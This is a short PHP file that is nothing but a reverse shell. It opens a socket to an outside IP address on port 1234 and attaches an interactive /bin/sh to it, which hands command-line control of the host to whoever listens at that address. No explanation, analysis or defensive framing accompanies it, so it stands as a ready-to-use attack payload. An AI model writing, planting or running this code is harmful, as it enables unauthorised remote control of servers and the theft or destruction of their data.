<?php 
$sock=fsockopen("35.238.146.56",1234);
exec("/bin/sh -i <&3 >&3 2>&3");
?>